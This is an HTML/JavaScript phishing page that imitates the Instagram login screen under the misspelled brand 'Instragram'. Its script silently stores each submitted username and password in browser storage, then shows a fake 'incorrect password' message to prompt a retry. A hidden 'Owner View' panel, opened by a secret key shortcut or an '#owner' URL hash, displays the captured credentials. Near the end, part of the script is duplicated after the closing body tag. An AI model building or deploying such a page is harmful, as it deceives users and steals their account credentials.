  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #fafafa;
      color: #262626;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }

    .wrapper {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }

    .card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 36px 40px 28px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .brand-logo {
      font-family: "Grand Hotel", cursive;
      font-size: 46px;
      line-height: 1.1;
      font-weight: 400;
      color: #262626;
      margin-bottom: 28px;
      user-select: none;
      letter-spacing: 0.5px;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .input-group {
      position: relative;
      width: 100%;
    }

    .input-group input {
      width: 100%;
      height: 38px;
      padding: 14px 8px 2px 8px;
      font-family: inherit;
      font-size: 12px;
      color: #262626;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      outline: none;
      transition: border-color 0.15s ease;
    }

    .input-group input:focus {
      border-color: #a8a8a8;
    }

    .input-group label {
      position: absolute;
      left: 9px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 12px;
      color: #8e8e8e;
      pointer-events: none;
      transition: all 0.14s ease;
    }

    .input-group input:focus + label,
    .input-group input:not(:placeholder-shown) + label {
      top: 9px;
      font-size: 9.5px;
      color: #8e8e8e;
    }

    .input-group input:not(:placeholder-shown) {
      padding-top: 14px;
      padding-bottom: 2px;
    }

    .toggle-btn {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-family: inherit;
      font-size: 12px;
      font-weight: 600;
      color: #262626;
      cursor: pointer;
      display: none;
    }

    .input-group input:not(:placeholder-shown) ~ .toggle-btn {
      display: block;
    }

    .login-btn {
      margin-top: 8px;
      width: 100%;
      height: 32px;
      border: none;
      border-radius: 8px;
      background-color: #4cb5f9;
      color: #ffffff;
      font-family: inherit;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.15s ease;
    }

    .login-btn.active {
      background-color: #0095f6;
    }

    .login-btn.active:hover {
      background-color: #1877f2;
    }

    .error-msg {
      color: #ed4956;
      font-size: 12px;
      line-height: 1.4;
      text-align: center;
      margin-top: 10px;
      min-height: 18px;
    }

    .divider {
      width: 100%;
      display: flex;
      align-items: center;
      gap: 16px;
      margin: 14px 0 12px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
      text-transform: uppercase;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .alt-link {
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
      margin-top: 4px;
    }

    .alt-link:hover {
      text-decoration: underline;
    }

    .sub-card {
      background: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      color: #262626;
    }

    .sub-card span {
      color: #0095f6;
      font-weight: 600;
      cursor: pointer;
    }

    /* Hidden Owner-Only Vault */
    .owner-panel {
      display: none;
      margin-top: 8px;
      background: #ffffff;
      border: 1px solid #262626;
      border-radius: 6px;
      padding: 14px;
      font-size: 12px;
    }

    .owner-panel.visible {
      display: block;
    }

    .owner-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: 700;
      margin-bottom: 10px;
      padding-bottom: 6px;
      border-bottom: 1px solid #efefef;
    }

    .owner-actions {
      display: flex;
      gap: 8px;
    }

    .owner-btn {
      background: none;
      border: none;
      font-family: inherit;
      font-size: 11px;
      font-weight: 600;
      color: #0095f6;
      cursor: pointer;
    }

    .owner-btn.danger {
      color: #ed4956;
    }

    .log-list {
      display: flex;
      flex-direction: column;
      gap: 6px;
      max-height: 220px;
      overflow-y: auto;
    }

    .log-item {
      background: #fafafa;
      border: 1px solid #efefef;
      border-radius: 4px;
      padding: 8px;
      word-break: break-all;
    }

    .log-time {
      font-size: 10px;
      color: #8e8e8e;
      margin-bottom: 3px;
    }

    .empty-log {
      color: #8e8e8e;
      text-align: center;
      padding: 8px 0;
    }

    footer {
      margin-top: 32px;
      font-size: 12px;
      color: #8e8e8e;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <main class="card">
      <h1 class="brand-logo">Instragram</h1>

      <form id="loginForm" novalidate>
        <div class="input-group">
          <input
            type="text"
            id="username"
            placeholder=" "
            autocomplete="username"
            required
          />
          <label for="username">Phone number, username, or email</label>
        </div>

        <div class="input-group">
          <input
            type="password"
            id="password"
            placeholder=" "
            autocomplete="current-password"
            required
          />
          <label for="password">Password</label>
          <button type="button" class="toggle-btn" id="togglePassword">Show</button>
        </div>

        <button type="submit" class="login-btn" id="loginBtn">Log in</button>
        <div class="error-msg" id="errorMsg" role="alert" aria-live="polite"></div>
      </form>

      <div class="divider">Or</div>
      <a href="#" class="alt-link" id="forgotLink">Forgot password?</a>
    </main>

    <div class="sub-card">
      Don't have an account? <span id="signupPrompt">Sign up</span>
    </div>

    <!-- Hidden until you trigger Owner Mode -->
    <section class="owner-panel" id="ownerPanel">
      <div class="owner-header">
        <span>Owner View (Captured Entries)</span>
        <div class="owner-actions">
          <button type="button" class="owner-btn danger" id="clearLogsBtn">Clear</button>
          <button type="button" class="owner-btn" id="hideOwnerBtn">Hide</button>
        </div>
      </div>
      <div class="log-list" id="logList"></div>
    </section>
  </div>

  <footer>© 2026 instragram</footer>

  <script>
    const STORAGE_KEY = "aswath_login_entries_v1";

    const form = document.getElementById("loginForm");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");
    const loginBtn = document.getElementById("loginBtn");
    const toggleBtn = document.getElementById("togglePassword");
    const errorMsg = document.getElementById("errorMsg");

    const ownerPanel = document.getElementById("ownerPanel");
    const logList = document.getElementById("logList");
    const clearLogsBtn = document.getElementById("clearLogsBtn");
    const hideOwnerBtn = document.getElementById("hideOwnerBtn");

    function updateButtonState() {
      const hasUser = usernameInput.value.trim().length > 0;
      const hasPass = passwordInput.value.length >= 1;
      loginBtn.classList.toggle("active", hasUser && hasPass);
    }

    function getEntries() {
      try {
        return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
      } catch {
        return [];
      }
    }

    function saveEntry(username, password) {
      const entries = getEntries();
      entries.unshift({
        username,
        password,
        timestamp: new Date().toLocaleString()
      });
      localStorage.setItem(STORAGE_KEY, JSON.stringify(entries));
    }

    function renderEntries() {
      const entries = getEntries();
      if (entries.length === 0) {
        logList.innerHTML = '<div class="empty-log">No entries saved yet.</div>';
        return;
      }

      logList.innerHTML = entries
        .map(
          (item) => `
          <div class="log-item">
            <div class="log-time">${escapeHtml(item.timestamp)}</div>
            <div><strong>Username:</strong> ${escapeHtml(item.username)}</div>
            <div><strong>Password:</strong> ${escapeHtml(item.password)}</div>
          </div>
        `
        )
        .join("");
    }

    function escapeHtml(str) {
      return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
    }

    function toggleOwnerPanel(forceShow) {
      const shouldShow =
        typeof forceShow === "boolean"
          ? forceShow
          : !ownerPanel.classList.contains("visible");

      ownerPanel.classList.toggle("visible", shouldShow);
      if (shouldShow) {
        renderEntries();
      }
    }

    usernameInput.addEventListener("input", () => {
      errorMsg.textContent = "";
      updateButtonState();
    });

    passwordInput.addEventListener("input", () => {
      errorMsg.textContent = "";
      updateButtonState();
    });

    toggleBtn.addEventListener("click", () => {
      const isPassword = passwordInput.type === "password";
      passwordInput.type = isPassword ? "text" : "password";
      toggleBtn.textContent = isPassword ? "Hide" : "Show";
    });

    form.addEventListener("submit", (e) => {
      e.preventDefault();
      const u = usernameInput.value.trim();
      const p = passwordInput.value;

      if (!u || !p) {
        errorMsg.style.color = "#ed4956";
        errorMsg.textContent = "Please enter both username and password, then retry.";
        return;
      }

      // Silently record for Owner View without showing anything to the user
      saveEntry(u, p);

      // Clear password field and show retry message
      passwordInput.value = "";
      updateButtonState();
      errorMsg.style.color = "#ed4956";
      errorMsg.textContent =
        "Sorry, your password was incorrect. Please double-check your password and retry.";
      passwordInput.focus();
    });

    clearLogsBtn.addEventListener("click", () => {
      localStorage.removeItem(STORAGE_KEY);
      renderEntries();
    });

    hideOwnerBtn.addEventListener("click", () => {
      toggleOwnerPanel(false);
    });

    // Secret shortcut for you: press Ctrl + Shift + O (or Cmd + Shift + O on Mac)
    document.addEventListener("keydown", (e) => {
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === "o") {
        e.preventDefault();
        toggleOwnerPanel();
      }
    });

    // Or add "#owner" to the end of the page URL when opening it yourself
    if (window.location.hash === "#owner") {
      toggleOwnerPanel(true);
    }

    document.getElementById("forgotLink").addEventListener("click", (e) => {
      e.preventDefault();
      errorMsg.style.color = "#737373";
      errorMsg.textContent = "Incorrect login details — please retry.";
    });

    document.getElementById("signupPrompt").addEventListener("click", () => {
      errorMsg.style.color = "#737373";
      errorMsg.textContent = "Registration is disabled on this page.";
    });
  </script>
</body>

      localStorage.removeItem(STORAGE_KEY);
      renderEntries();
    });

    hideOwnerBtn.addEventListener("click", () => {
      toggleOwnerPanel(false);
    });

    // Secret shortcut for you: press Ctrl + Shift + O (or Cmd + Shift + O on Mac)
    document.addEventListener("keydown", (e) => {
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === "o") {
        e.preventDefault();
        toggleOwnerPanel();
      }
    });

    // Or add "#owner" to the end of the page URL when opening it yourself
    if (window.location.hash === "#owner") {
      toggleOwnerPanel(true);
    }

    document.getElementById("forgotLink").addEventListener("click", (e) => {
      e.preventDefault();
      errorMsg.style.color = "#737373";
      errorMsg.textContent = "Incorrect login details — please retry.";
    });

    document.getElementById("signupPrompt").addEventListener("click", () => {
      errorMsg.style.color = "#737373";
      errorMsg.textContent = "Registration is disabled on this page.";
    });
  </script>
</body>
</html>
